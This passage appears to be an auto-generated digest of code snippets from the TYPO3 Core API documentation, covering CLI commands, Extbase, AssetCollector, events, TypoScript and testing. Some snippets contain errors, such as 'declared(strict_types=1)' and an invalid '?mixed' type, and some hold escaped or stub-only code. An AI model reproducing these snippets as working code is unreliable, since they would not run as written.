Bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 messenger:consume <receiver-name>\n```\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/typo3 messenger:consume doctrine\n```\n\nLANGUAGE: Bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 messenger:consume doctrine\n```\n\n----------------------------------------\n\nTITLE: Registering Extended Repository in ext_localconf.php\nDESCRIPTION: Configuration that instructs TYPO3 to use the extended repository instead of the original one when the original repository is requested via dependency injection in controllers or services.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n(static function() {\n    // ... model registration from previous example ...\n    \n    \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n        \\TYPO3\\CMS\\Extbase\\Object\\Container\\Container::class\n    )->registerImplementation(\n        \\OriginalVendor\\OriginalExtension\\Domain\\Repository\\SomeModelRepository::class,\n        \\MyVendor\\MyExtension\\Domain\\Repository\\MyExtendedModelRepository::class\n    );\n})();\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoloading in TYPO3 Extension\nDESCRIPTION: This code snippet demonstrates how to configure autoloading for a TYPO3 extension using the `ext_emconf.php` file. Specifically, it shows how to define the PSR-4 namespace and its corresponding directory. The 'autoload' key specifies the autoloading configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/ExtEmconfAutoload.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$EM_CONF[$_EXTKEY] = [\n    'autoload' => [\n        'psr-4' => [\n            'TTN\\\\Tea\\\\' => 'Classes/',\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Using AssetCollector API in PHP\nDESCRIPTION: The API interface for the AssetCollector class, showing methods for adding, retrieving and checking JavaScript, CSS and images in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Assets/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Register JavaScript files\n$assetCollector->addJavaScript(\n    string $identifier,          // used as array key, should be unique\n    string $source,              // file or path to JavaScript, or inline code\n    array $attributes = [],      // additional HTML attributes for the <script> tag\n    array $options = []\n    // options:\n    // - priority (bool) = false           // render in <head> section if true\n    // - useNonce (bool) = false          // add the nonce attribute when CSP is enabled\n    // - external (bool) = false          // if set, no URI processing is done to the source\n    // - excludeFromConcatenation (bool)  // Excludes the script from concatenation (page.includeJSFooter/page.includeJS)\n    // - disableCompression (bool)        // Disables compression of the script (page.includeJSFooter/page.includeJS)\n);\n\n// Check if a JavaScript file is registered\n$assetCollector->hasJavaScript(string $identifier): bool;\n\n// Register inline JavaScript\n$assetCollector->addInlineJavaScript(\n    string $identifier,          // used as array key, should be unique\n    string $source,              // JavaScript code\n    array $attributes = [],      // additional HTML attributes for the <script> tag\n    array $options = []\n    // options:\n    // - priority (bool) = false  // render in <head> section if true\n    // - useNonce (bool) = false  // add the nonce attribute when CSP is enabled\n);\n\n// Check if inline JavaScript is registered\n$assetCollector->hasInlineJavaScript(string $identifier): bool;\n\n// Register StyleSheet files\n$assetCollector->addStyleSheet(\n    string $identifier,          // used as array key, should be unique\n    string $source,              // file or path to CSS file\n    array $attributes = [],      // additional HTML attributes for the <link> tag\n    array $options = []\n    // options:\n    // - priority (bool) = false          // control the order of the stylesheet\n    // - useNonce (bool) = false         // add the nonce attribute when CSP is enabled\n    // - external (bool) = false          // if set, no URI processing is done to the source\n    // - excludeFromConcatenation (bool) // Excludes the CSS file from concatenation (page.includeCSSLibs/page.includeCSS)\n    // - disableCompression (bool)       // Disables compression of the CSS file (page.includeCSSLibs/page.includeCSS)\n    // - forceOnTop (bool)               // Adds a CSS file before any other CSS file (page.includeCSSLibs/page.includeCSS)\n    // - allWrap                         // Wraps the generated <link> tag\n);\n\n// Check if a CSS file is registered\n$assetCollector->hasStyleSheet(string $identifier): bool;\n\n// Register inline CSS\n$assetCollector->addInlineStyleSheet(\n    string $identifier,          // used as array key, should be unique\n    string $source,              // CSS code\n    array $attributes = [],      // additional HTML attributes for the <style> tag\n    array $options = []\n    // options:\n    // - priority (bool) = false  // control the order of the stylesheet\n    // - useNonce (bool) = false  // add the nonce attribute when CSP is enabled\n);\n\n// Check if inline CSS is registered\n$assetCollector->hasInlineStyleSheet(string $identifier): bool;\n\n// Register media like icons or images to be available on the page\n$assetCollector->addMedia(\n    string $identifier,          // used as array key, should be unique\n    string $source,              // path to the media file\n    array $additionalInformation = []\n);\n\n// Check if media is registered\n$assetCollector->hasMedia(string $identifier): bool;\n\n// Get all registered JavaScript assets\n$assetCollector->getJavaScripts(?bool $priority = null): array;\n\n// Get all registered inline JavaScript assets\n$assetCollector->getInlineJavaScripts(?bool $priority = null): array;\n\n// Get all registered StyleSheet assets\n$assetCollector->getStyleSheets(?bool $priority = null): array;\n\n// Get all registered inline StyleSheet assets\n$assetCollector->getInlineStyleSheets(?bool $priority = null): array;\n\n// Get all registered media assets (images, icons, etc.)\n$assetCollector->getMedia(): array;\n\n```\n\n----------------------------------------\n\nTITLE: Implementing GithubLinkBuilder for TYPO3 CMS in PHP\nDESCRIPTION: This class builds a TypoLink to a GitHub issue. It extends AbstractTypolinkBuilder and implements the build method to create a LinkResult object. The class validates the issue ID and throws an UnableToLinkException if invalid.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GithubLinkBuilder.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Frontend\\Typolink\\LinkResult;\nuse TYPO3\\CMS\\Frontend\\Typolink\\LinkResultInterface;\nuse TYPO3\\CMS\\Frontend\\Typolink\\UnableToLinkException;\n\n/**\n * Builds a TypoLink to a Github issue\n */\nclass GithubLinkBuilder extends AbstractTypolinkBuilder\n{\n    private const TYPE_GITHUB = 'github';\n\n    public function build(\n        array &$linkDetails,\n        string $linkText,\n        string $target,\n        array $conf,\n    ): LinkResultInterface {\n        $issueId = (int)$linkDetails['issue'];\n        if ($issueId < 1) {\n            throw new UnableToLinkException(\n                '\"' . $issueId . '\" is not a valid GitHub issue number.',\n                // Use the Unix timestamp of the time of creation of this message\n                1665304602,\n                null,\n                $linkText,\n            );\n        }\n        $url = 'https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/issues/' . $issueId;\n\n        return (new LinkResult(self::TYPE_GITHUB, $url))\n            ->withTarget($target)\n            ->withLinkConfiguration($conf)\n            ->withLinkText($linkText);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AlterTableDefinitionStatementsEvent Class in TYPO3 CMS\nDESCRIPTION: PHP class definition for handling table definition statements in TYPO3 CMS. This class provides methods to add, get, and set SQL data for table creation statements from extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AlterTableDefinitionStatementsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Database\\Event;\n\nclass AlterTableDefinitionStatementsEvent\n{\n    public function addSqlData(?mixed $data)\n    {\n        // Add SQL data\n    }\n\n    public function getSqlData(): array\n    {\n        // Return SQL data\n    }\n\n    public function setSqlData(array $sqlData)\n    {\n        // Set SQL data\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Service Option in PHP for TYPO3 CMS Service\nDESCRIPTION: Demonstrates how to retrieve a service option value using the getServiceOption() method within a TYPO3 CMS service class. This method handles default values and configuration hierarchy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Developer/ServiceApi.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$ignoreBozo = $this->getServiceOption('ignoreBozo');\n```\n\n----------------------------------------\n\nTITLE: TypoScript Multiline Assignment\nDESCRIPTION: This snippet demonstrates how to assign multiline strings to TypoScript properties using parentheses. This is useful for defining larger text blocks or HTML snippets directly within TypoScript configurations. The TEXT object is used to render the assigned value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorMultiLine.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier= TEXT\nmyIdentifier.value (\n   This is a\n   multiline assignment\n)\n```\n\n----------------------------------------\n\nTITLE: Removing Content Element from Wizard in TSConfig\nDESCRIPTION: Demonstrates how to remove a specific content element from a group in the New Content Element wizard using Page TSconfig.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_2\n\nLANGUAGE: TSConfig\nCODE:\n```\nmod.wizards.newContentElement.wizardItems.special {\n    removeItems := addToList(html)\n}\n```\n\n----------------------------------------\n\nTITLE: Debug Mode TypoScript Configuration\nDESCRIPTION: TypoScript configuration to enable detailed error handling for debugging Fluid templates and other frontend issues.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/TYPO3.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.contentObjectExceptionHandler = 0\n```\n\n----------------------------------------\n\nTITLE: Configuring TEXT object with stdWrap in TypoScript\nDESCRIPTION: This TypoScript snippet demonstrates how to configure a TEXT object with stdWrap properties. It sets the text content to the value of the 'title' field, and if that field is empty, it falls back to using the level title at level 0.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlock3.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n\"myIdentifier = TEXT\\nmyIdentifier {\\n   stdWrap {\\n      field = title\\n      ifEmpty {\\n         data = leveltitle:0\\n      }\\n   }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Defining Info Model Class in TYPO3\nDESCRIPTION: Implements an Info model class with getters and setters for name and bodytext properties. The class extends AbstractEntity and implements the Stringable interface for string representation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/ModelWithPublicGetters.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass Info extends AbstractEntity implements \\Stringable\n{\n    protected string $name = '';\n\n    protected string $bodytext = '';\n\n    public function getName(): string\n    {\n        return $this->name;\n    }\n\n    public function getBodytext(): string\n    {\n        return $this->bodytext;\n    }\n\n    public function setBodytext(string $bodytext): void\n    {\n        $this->bodytext = $bodytext;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining SlugRedirectChangeItemCreatedEvent Class in PHP for TYPO3 CMS Redirects\nDESCRIPTION: This code snippet defines the SlugRedirectChangeItemCreatedEvent class in the TYPO3\\CMS\\Redirects\\Event namespace. It includes two methods: getSlugRedirectChangeItem() to retrieve the current SlugRedirectChangeItem, and setSlugRedirectChangeItem() to set a new SlugRedirectChangeItem.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/SlugRedirectChangeItemCreatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Redirects\\Event;\n\nclass SlugRedirectChangeItemCreatedEvent\n{\n    public function getSlugRedirectChangeItem(): \\TYPO3\\CMS\\Redirects\\RedirectUpdate\\SlugRedirectChangeItem\n    {\n        // Implementation not shown\n    }\n\n    public function setSlugRedirectChangeItem(\\TYPO3\\CMS\\Redirects\\RedirectUpdate\\SlugRedirectChangeItem $slugRedirectChangeItem): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Module Access Check Method\nDESCRIPTION: Method to verify access permissions for a specific module and user combination.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: accessGranted(string $identifier, \\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user, bool $respectWorkspaceRestrictions = true)\n:returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeStdWrapFunctionsInitializedEvent Class in TYPO3 Frontend ContentObject\nDESCRIPTION: Documentation for the BeforeStdWrapFunctionsInitializedEvent class in the TYPO3 CMS Frontend ContentObject namespace. This event is dispatched before any stdWrap function is initialized or called, allowing for modification of content and access to configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/BeforeStdWrapFunctionsInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass BeforeStdWrapFunctionsInitializedEvent\n{\n    // Event is dispatched before any stdWrap function is initialized / called\n\n    public function getContent(): ?string\n    {\n        // Returns the current content\n    }\n\n    public function setContent(string $content)\n    {\n        // Sets the content\n    }\n\n    public function getConfiguration(): array\n    {\n        // Returns the configuration array\n    }\n\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n    {\n        // Returns the ContentObjectRenderer instance\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing ViewHelper Namespaces with HTML Tag\nDESCRIPTION: Demonstrates how to import ViewHelper namespaces using the HTML tag with xmlns attribute, which is useful for IDE autocompletion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_15\n\nLANGUAGE: html\nCODE:\n```\n<html\n   xmlns:blog=\"http://typo3.org/ns/Myvendor/MyExtension/ViewHelpers\"\n   data-namespace-typo3-fluid=\"true\"\n>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Running Unit Tests with runTests.sh Script\nDESCRIPTION: Command to execute unit tests using the runTests.sh script. This script simplifies test execution by handling environment setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nBuild/Script/runTests.sh -s unit\n```\n\n----------------------------------------\n\nTITLE: Manual Instance Registration for Mocking in TYPO3\nDESCRIPTION: Illustrates how to manually register mock instances for dependencies created using GeneralUtility::makeInstance() in unit tests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nclass SomeTest extends \\TYPO3\\TestingFramework\\Core\\Unit\\UnitTestCase {\n    /**\n     * @test\n     */\n    public function testMethodWithManualMockRegistration() {\n        $mockDependency = $this->createMock(SomeDependencyClass::class);\n        GeneralUtility::addInstance(SomeDependencyClass::class, $mockDependency);\n        \n        $systemUnderTest = new ClassUnderTest();\n        $systemUnderTest->methodToTest();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: MM-Table Naming for Multiple-Multiple Relations\nDESCRIPTION: Shows the naming convention for junction tables in Extbase relations\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/BestPractises/NamingConventions.rst#2025-04-16_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\ntx_<extkeyprefix>_domain_model_<model-name-1>_<model-name-2>_mm\n```\n\n----------------------------------------\n\nTITLE: Configuring Cover Areas in TYPO3 CMS\nDESCRIPTION: Configuration for defining cover areas that indicate where overlaid DOM elements will appear in relation to the image.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/General/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n'config' => [\n    'type' => 'imageManipulation',\n    'cropVariants' => [\n        'mobile' => [\n            'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n            'coverAreas' => [\n                [\n                    'x' => 0.05,\n                    'y' => 0.85,\n                    'width' => 0.9,\n                    'height' => 0.1,\n                ]\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Export Help Command\nDESCRIPTION: Command to display complete list of export options and help information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateContent/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 help impexp:export\n```\n\n----------------------------------------\n\nTITLE: Defining CacheInstruction Class in TYPO3 CMS Frontend Cache\nDESCRIPTION: This snippet defines the CacheInstruction class within the TYPO3\\CMS\\Frontend\\Cache namespace. The class is responsible for managing cache instructions during Frontend rendering, particularly for disabling caching in various scenarios.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/CacheInstruction.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Frontend\\Cache;\n\nclass CacheInstruction\n{\n    // Class implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing TYPO3 Locale Object\nDESCRIPTION: Demonstrates how to create a new Locale object for German (Switzerland) using the TYPO3\\CMS\\Core\\Localization\\Locale class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/Locale.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Localization\\Locale;\n\n$locale = new Locale('de-CH');\n```\n\n----------------------------------------\n\nTITLE: Running Functional Tests for TYPO3 Styleguide\nDESCRIPTION: Shell commands to run functional tests using the runTests.sh script, showing the output of a successful test run that creates a database instance via Docker.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nlolli@apoc /var/www/local/git/styleguide $ Build/Scripts/runTests.sh -s functional\nCreating network \"local_default\" with the default driver\nCreating local_mariadb10_1 ... done\nWaiting for database start...\nDatabase is up\nPHP ...\nPHPUnit ... by Sebastian Bergmann and contributors.\n\n..                                                                  2 / 2 (100%)\n\nTime: 5.23 seconds, Memory: 28.00MB\n\nOK (2 tests, 3 assertions)\nStopping local_mariadb10_1 ... done\nRemoving local_functional_mariadb10_run_1 ... done\nRemoving local_mariadb10_1                ... done\nRemoving network local_default\nlolli@apoc /var/www/local/git/styleguide $\n```\n\n----------------------------------------\n\nTITLE: Including Screenshot Image in RST Documentation\nDESCRIPTION: RST directive for including a screenshot image with caption showing the editing interface for multiple records. The image shows editing of fields across two pages and one haiku simultaneously.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/EditLinks/EditLinksEditRestricted.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/EditLinks/EditLinksEditRestricted.png\n   :class: with-shadow\n\n   Editing of fields of two pages and one haiku at once\n```\n\n----------------------------------------\n\nTITLE: Configuring Page Link Handler with Page ID Selector in TSconfig\nDESCRIPTION: This snippet demonstrates how to enable the page ID selector field in the link browser using Page TSconfig. The page ID selector allows users to directly enter a page UID when creating links.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Configuration.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.page.configuration.pageIdSelector.enabled = 1\n```\n\n----------------------------------------\n\nTITLE: Defining Coordinates Model in PHP\nDESCRIPTION: This code snippet shows an example implementation of a Coordinates model class. It includes a constructor for creating the object with latitude and longitude, and a static method for creating the object from a string representation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/RecordCreationEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Domain\\Model;\n\nfinal class Coordinates\n{\n    public function __construct(\n        public readonly float $latitude,\n        public readonly float $longitude,\n    ) {}\n\n    public static function fromString(string $coordinates): self\n    {\n        [$latitude, $longitude] = explode(',', $coordinates);\n        return new self((float)$latitude, (float)$longitude);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Blog Example Set in YAML\nDESCRIPTION: This YAML configuration defines the name and label for a TYPO3 blog example extension set. It specifies the set identifier and a human-readable label for the blog example.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/_Sets/_blog_example/_config.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: t3docs/blog-example\nlabel: Blog example set\n```\n\n----------------------------------------\n\nTITLE: Creating Blog Repository Class in TYPO3 PHP\nDESCRIPTION: Defines a basic BlogRepository class that extends the core Repository class. This class serves as the data access layer for Blog entities in TYPO3, providing standard repository functionality for blog management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/BlogRepository.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass BlogRepository extends Repository\n{\n\n}\n```\n\n----------------------------------------\n\nTITLE: Data Submission with DataHandler (PHP)\nDESCRIPTION: Demonstrates basic data submission to the database using DataHandler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/UsingDataHandler/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\DataHandling\\DataHandler;\\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\\n\\n$dataHandler = GeneralUtility::makeInstance(DataHandler::class);\\n$dataHandler->start($data, []);\\n$dataHandler->process_datamap();\n```\n\n----------------------------------------\n\nTITLE: Displaying File Storage Screenshot in RST Documentation\nDESCRIPTION: RST markup for including an automatic screenshot of file storage functionality in TYPO3 documentation. The image is displayed with a shadow effect applied.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/FileStorage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. Automatic screenshot: Remove this line if you want to manually change this file\n\n.. figure:: /Images/AutomaticScreenshots/AccessControl/FileStorage.png\n   :class: with-shadow\n```\n\n----------------------------------------\n\nTITLE: Registering a FlexForm Configuration with a Plugin\nDESCRIPTION: Example of registering a FlexForm configuration schema with a plugin in TCA Overrides, enabling the configuration to be attached to the plugin in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n// Configure the plugin: add FlexForm fields\n$pluginName = 'HaikuList';\n$extensionName = 'example';\n$pluginSignature = strtolower($extensionName) . '_' . strtolower($pluginName);\n\n// Register FlexForms for the plugin if needed\n$GLOBALS['TCA']['tt_content']['types']['list']['subtypes_addlist'][$pluginSignature]\n    = 'pi_flexform';\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addPiFlexFormValue(\n    $pluginSignature,\n    'FILE:EXT:' . $extensionName . '/Configuration/FlexForms/PluginHaikuList.xml'\n);\n```\n\n----------------------------------------\n\nTITLE: Flushing TYPO3 Cache in Legacy Installation\nDESCRIPTION: This command flushes the TYPO3 cache in a legacy installation. It uses the TYPO3 CLI script located in the typo3/sysext/core/bin directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/_includes/CliCacheFlush.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 cache:flush\n```\n\n----------------------------------------\n\nTITLE: UML Diagram for Backend Groups Hierarchy in TYPO3\nDESCRIPTION: This UML diagram illustrates a sample backend groups hierarchy in TYPO3, showing how file mounts and role-based groups can be structured. It demonstrates the relationship between different user groups, file storage access, and role assignments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/GeneralRecommendations/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: plantuml\nCODE:\n```\n@startuml\n\npackage \"Files Structure\" {\n    folder \"File Storage\" {\n        folder \"Website A\" {\n            file \"fileA1.jpg\"\n            file \"fileA2.jpg\"\n        }\n        folder \"Website B\" {\n            file \"fileB1.jpg\"\n            file \"fileB2.jpg\"\n        }\n        folder \"Shared\" {\n            file \"shared1.jpg\"\n            file \"shared2.jpg\"\n        }\n    }\n}\n\npackage \"Backend User Groups\" {\n    together {\n        card \"File Mount for Website A\" as fma\n        card \"Group for Website A file mount\" as ga\n    }\n    together {\n        card \"File Mount for Website B\" as fmb\n        card \"Group for Website B file mount\" as gb\n    }\n    together {\n        card \"File Mount for Shared\" as fms\n        card \"Group for Shared file mount\" as gs\n    }\n    together {\n        card \"User 1:\\nEditor role\" as u1\n        card \"User 2:\\nEditor role\" as u2\n    }\n    card \"Editor Role Group\" as erg\n}\n\n\"Website A\" ..> fma\nfma ..> ga\n\n\"Website B\" ..> fmb\nfmb ..> gb\n\n\"Shared\" ..> fms\nfms ..> gs\n\nga ..> erg\ngb ..> erg\ngs ..> erg\n\nerg ..> u1\nerg ..> u2\n\n@enduml\n```\n\n----------------------------------------\n\nTITLE: Defining PasswordChangeEvent Class Path in TYPO3\nDESCRIPTION: Specifies the PHP namespace and class path for the PasswordChangeEvent used in TYPO3's Frontend Login system. This event provides access to password change information before it is stored in the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/PasswordChangeEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\FrontendLogin\\Event\\PasswordChangeEvent\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Info Window Using JSON Arguments\nDESCRIPTION: HTML button that triggers TYPO3.InfoWindow.showItem module function to display record details using JSON-formatted arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Navigation/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<a\n    class=\"btn btn-default\"\n    href=\"#\"\n    data-dispatch-action=\"TYPO3.InfoWindow.showItem\"\n    data-dispatch-args=\"[&quot;tt_content&quot;,123]\"\n>\n    Some text\n</a>\n```\n\n----------------------------------------\n\nTITLE: HTML Link with TYPO3 Page Reference\nDESCRIPTION: Example of a soft reference to a TYPO3 page using t3:// protocol in an HTML link.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SoftReferences/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"t3://page?uid=1\">link to page 1</a>\n```\n\n----------------------------------------\n\nTITLE: Creating a User with Named Arguments in PHP\nDESCRIPTION: This snippet demonstrates the basic usage of named arguments for a function that creates a user. It allows specifying parameter values by their names, enhancing clarity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nfunction createUser($username, $email)\n{\n    // code to create user\n}\ncreateUser(email: 'john.doe@example.com', username: 'john');\n```\n\n----------------------------------------\n\nTITLE: Creating Table of Contents in reStructuredText\nDESCRIPTION: This snippet generates a table of contents for the subpages related to using services in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. toctree::\n   :titlesonly:\n\n   ServicePrecedence\n   SimpleUse\n   UseWithSubtypes\n   ServiceChain\n```\n\n----------------------------------------\n\nTITLE: EnrichFileMetaDataEvent Class Definition in TYPO3 CMS Core Resource\nDESCRIPTION: This class defines an event that is triggered after a file metadata record has been loaded from the database. It provides methods to access and modify the file's metadata, allowing for runtime extensions, translations, and workspace overlays.\nSOURCE: 